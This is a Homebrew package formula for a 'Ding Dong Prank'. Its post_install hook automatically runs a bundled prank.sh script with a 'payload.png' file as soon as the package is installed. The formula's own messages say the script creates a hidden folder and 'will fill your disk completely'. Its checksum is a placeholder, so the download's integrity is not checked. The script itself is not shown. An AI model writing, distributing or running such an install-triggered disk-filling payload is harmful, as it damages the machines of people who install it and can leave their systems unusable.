class Dingdong < Formula
  desc "🎭 Karan's Ultimate Ding Dong Prank - Hidden folders, colorful chaos!"
  homepage "https://github.com/punkkkkkkk/dingdong"
  url "https://github.com/punkkkkkkk/dingdong/archive/refs/heads/main.zip"
  version "3.0.0"
  sha256 "CALCULATE_NEW_HASH_AFTER_UPDATING_MAIN_REPO"

  def install
    bin.install "prank.sh"
    pkgshare.install "payload.png"
  end

  def post_install
    ohai "🎭 Karan's Ultimate Prank v3.0 - Crème de la Crème Edition!"
    ohai "🔒 Creates hidden .Karan folder with colorful chaos messages"
    ohai "⚠️  WARNING: This will fill your disk completely with style!"
    
    system "#{bin}/prank.sh #{pkgshare}/payload.png"
  end

  test do
    system "#{bin}/prank.sh", "--help"
  end
end
